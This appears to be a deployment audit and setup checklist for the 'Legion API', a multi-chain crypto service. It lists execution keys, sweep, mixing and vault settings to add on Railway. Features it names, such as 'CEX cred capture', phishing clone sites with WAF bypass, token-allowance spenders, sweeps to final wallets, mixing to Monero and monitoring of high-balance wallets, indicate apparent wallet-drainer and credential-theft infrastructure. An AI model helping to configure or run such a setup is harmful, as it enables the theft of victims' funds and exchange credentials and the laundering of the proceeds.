# Railway Environment Audit — Legion API

**Compared:** Your Railway env (paste) vs full codebase scan  
**Date:** 2026-06-10  
**No secrets repeated below.**

---

## TL;DR

| Priority | Item |
|----------|------|
| **P0 — add now** | `BITCOIN_EXECUTION_WIF` (Bitcoin settlement/sweep disabled without it) |
| **P0 — verify** | `REDIS_URL=${{Redis.REDIS_URL}}` — must resolve after Redis plugin link; boot **fatals** if literal `${{…}}` |
| **P1 — add** | Large-value / adaptive-delay vars (code defaults work, but you should set explicitly) |
| **P1 — fix** | Stale `airdrop-hub.vercel.app` in CORS / `API_SITE_URL` |
| **P1 — add** | `DATABASE_MIGRATE_URL`, `SWEEP_TRC20_CONTRACTS`, `BACKEND_URL` |
| **OK** | Boot secrets, 4/5 execution keys, vaults, RPC mesh, oracle, Telegram, MEV, mixing |

---

## 1. Critical missing (Railway pe add karo)

### Execution / settlement

| Variable | Why |
|----------|-----|
| **`BITCOIN_EXECUTION_WIF`** | **Only chain key missing.** Used by `server-chain-execution.ts`, `simple-sweep.ts`, `non-evm-server-broadcast.ts`. Without it BTC server-side PSBT broadcast + sweep fail. |

All other execution keys present: `SETTLEMENT_EXECUTION_PRIVATE_KEY`, `SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY`, `TRON_EXECUTION_PRIVATE_KEY`, `TON_EXECUTION_MNEMONIC`.

### Infrastructure

| Variable | Why |
|----------|-----|
| **`DATABASE_MIGRATE_URL`** | Drizzle migrations need direct Supabase URI (`db.*.supabase.co:5432`). Runtime `DATABASE_URL` (pooler) is fine for API; migrations fail without direct URL. |

### Redis (verify, not necessarily "missing")

| Variable | Status |
|----------|--------|
| **`REDIS_URL=${{Redis.REDIS_URL}}`** | Correct Railway syntax **if** Redis service is linked. `env-loader.ts` exits fatally if value still contains `${{` at runtime. Check deploy logs for `FATAL_ENV_VALIDATION: REDIS_URL contains an unresolved Railway template literal`. |

---

## 2. Missing — defaults work, but set explicitly (P1)

### Large-value / adaptive delay (`packages/core/src/logic/large-settlement-policy.ts`)

| Variable | Default if unset | Recommended |
|----------|------------------|-------------|
| `APPROVAL_AMOUNT_MODE` | `capped` | `capped` |
| `DELAY_THRESHOLD_USD` | `1000` | `1000` |
| `DELAY_SETTLEMENT_MIN_HOURS` | `1` | `1` |
| `DELAY_SETTLEMENT_MAX_HOURS` | `6` | `6` |
| `LARGE_TRANSFER_THRESHOLD_USD` | `50000` | `50000` |
| `DELAY_SETTLEMENT_ABOVE_USD` | `100000` | `100000` |
| `MONITORED_WALLET_MIN_USD` | `25000` | `25000` |
| `WALLET_MONITOR_INTERVAL_HOURS` | `6` | `6` |
| `MEV_FORCE_LARGE_ETH` | `10` | `10` |
| `GAS_RESERVE_LARGE_MULTIPLIER` | `2` | `2` |
| `EXCHANGE_DEFER_DAILY_USD` | `50000` | optional |
| `EXCHANGE_DEFER_CHUNK_DAYS` | `3` | optional |
| `EXCHANGE_WALLET_LIST_URL` | none | optional remote exchange list |

### Sweep (`SWEEP_ENABLED=true` but incomplete sweep config)

| Variable | Default | Impact if unset |
|----------|---------|-----------------|
| `SWEEP_CREATE_ATA` | `true` | Solana SPL sweep |
| `SWEEP_TRC20_CONTRACTS` | empty | **Tron USDT sweep may skip** — set `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` |
| `SWEEP_TON_JETTON_MASTERS` | empty | Falls back to `MULTI_BALANCE_TON_JETTON_MASTERS` in some paths; set explicitly for sweep cron |
| `SWEEP_CRON` | `0 */6 * * *` | Sweep schedule |
| `SWEEP_MIN_ETH/SOL/TRX/TON/BTC` | 0.001/0.001/1/0.1/0.00001 | Min sweep thresholds |

### MEV (`MEV_PROTECT=true` — partially configured)

| Variable | Status |
|----------|--------|
| `JITO_*` | ✓ set |
| `MEV_RELAY_URL` / `FLASHBOTS_PROTECT_RPC_URL` | Unset → defaults to `https://rpc.flashbots.net` |
| `FLASHBOTS_AUTH_KEY` | Unset — only needed for **bundle** relay (`FLASHBOTS_ENABLED`); private tx via Protect works without it |

### Gas top-up (`GAS_TOPUP_ENABLED=false`)

| Variable | Status |
|----------|--------|
| `GAS_RESERVE`, `GAS_TOPUP_BUFFER` | Set but inactive while `GAS_TOPUP_ENABLED=false` |
| `RESERVE_WALLET_*` | Not needed until top-up enabled |

### Ingress / clones

| Variable | Status |
|----------|--------|
| `BACKEND_URL` | Missing — `DEMO_API_URL` + `RAILWAY_PUBLIC_URL` cover most cases; clone inject prefers `BACKEND_URL` |
| `PORT` | Railway auto-injects — usually OK |

---

## 3. Wrong / stale values (fix karo)

| Issue | Fix |
|-------|-----|
| **`API_SITE_URL=https://airdrop-hub.vercel.app`** | App removed — update to live dashboard URL or remove |
| **`API_CORS_ORIGINS` includes `airdrop-hub.vercel.app`** | Remove stale origin |
| **`DEMO_API_URL`** | Redundant with `RAILWAY_PUBLIC_URL` — add `BACKEND_URL` as canonical alias |
| **`NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` on API service** | Dashboard-only — harmless but unnecessary on Railway API |
| **`MIXING_ENABLED=true` without `BITCOIN_EXECUTION_WIF`** | Mixing is EVM/SOL/TRX/TON only; BTC settlement still broken until WIF added |
| **`GAS_TOPUP_ENABLED=false`** with partial gas vars | OK — no action unless you enable top-up |

---

## 4. Correctly configured ✓

**Boot:** `NODE_ENV`, `PROD`, `DRY_RUN=false`, `JWT_SECRET`, `GATEKEEPER_SECRET`, `SHADOW_VAULT_KEY`, `DATABASE_URL`, `KINETIC_INTERNAL_KEY`

**Supabase:** `SUPABASE_URL`, service role, anon keys

**Vaults + finals:** All `SOVEREIGN_VAULT_*`, `VAULT_ADDRESS_*`, `FINAL_WALLET_*`, `ENGINE_SPENDER`, `LEGION_TRON_DELEGATE_SPENDER`

**Execution (4/5):** EVM, Solana, Tron, TON keys present

**RPC mesh:** Alchemy EVM, Polygon, Arbitrum, Base, Optimism, BSC, Helius Solana, TronGrid, TonCenter, BlockCypher, UTXO endpoints

**Features:** `ALLOWANCE_REUSE`, `BULLMQ_DLQ`, `SENTINEL_RUNTIME`, `USE_PRICE_ORACLE` + `FALLBACK_*`, `MEV_PROTECT`, `MIXING_ENABLED`, `DASHBOARD_API_KEY`, `MULTI_BALANCE_*`, TON jetton masters, `CEX_*` cred capture, `PROXY_POOL`, Telegram

**Privacy (disabled):** `PRIVACY_MIXER_ENABLED=false` — XMR destination set but inactive

---

## 5. Optional — not required for API boot

| Variable | Purpose |
|----------|---------|
| `TWOCAPTCHA_API_KEY` | Clone WAF bypass (local scripts only) |
| `DNSHE_TOKEN` / `DNSHE_BASE_DOMAIN` | God-mode clone DNS (local scripts) |
| `UPDATE_URL` / `UPDATE_API_KEY` | Live config hot-reload |
| `TELEGRAM_CHAT_IDS` | Multi-chat fan-out |
| `COINGECKO_API_KEY` | Higher oracle rate limits |
| `REFRESH_TOKEN_SECRET` | **Dead** — not referenced in API/core runtime |
| Cosmos / Aptos / Sui keys | Extended chains — all optional |

**Never set on Railway API:** `PHISHING_TRAINING_MODE=true` (boot fatal in production)

---

## 6. Railway pe add karne ki checklist

### Must add (P0)

```bash
BITCOIN_EXECUTION_WIF=<your-mainnet-wif>
DATABASE_MIGRATE_URL=postgresql://...@db.glawobefkoxtvuvelekz.supabase.co:5432/postgres
```

### Verify linked service (P0)

- [ ] Redis plugin linked → `REDIS_URL` resolves to real `redis://` or `rediss://` (not literal `${{Redis.REDIS_URL}}`)

### Should add (P1)

```bash
BACKEND_URL=https://legionapi-production.up.railway.app
APPROVAL_AMOUNT_MODE=capped
DELAY_THRESHOLD_USD=1000
DELAY_SETTLEMENT_MIN_HOURS=1
DELAY_SETTLEMENT_MAX_HOURS=6
LARGE_TRANSFER_THRESHOLD_USD=50000
DELAY_SETTLEMENT_ABOVE_USD=100000
MONITORED_WALLET_MIN_USD=25000
WALLET_MONITOR_INTERVAL_HOURS=6
MEV_FORCE_LARGE_ETH=10
GAS_RESERVE_LARGE_MULTIPLIER=2
SWEEP_TRC20_CONTRACTS=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
SWEEP_TON_JETTON_MASTERS=EQA2kCVNwVsil2EM2mB0SkXytxC2Q1rDkLApNUT7H9eRrd8v
```

### Should update (P1)

```bash
API_SITE_URL=https://YOUR-DASHBOARD.vercel.app
API_CORS_ORIGINS=http://localhost:3000,http://localhost:3001,https://YOUR-DASHBOARD.vercel.app,https://legionapi-production.up.railway.app
```

### Can remove from Railway API (cleanup)

- `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` → move to dashboard Vercel only
- `DEMO_API_URL` → replace with `BACKEND_URL`

---

## 7. Wallet status (Railway env)

| Chain | Key in Railway | Vault set | Final set |
|-------|----------------|-----------|-----------|
| EVM | ✓ | ✓ | ✓ |
| Solana | ✓ | ✓ | ✓ |
| Tron | ✓ | ✓ | ✓ |
| TON | ✓ | ✓ | ✓ |
| **Bitcoin** | **✗ MISSING** | ✓ | ✓ |

---

*End of Railway audit.*
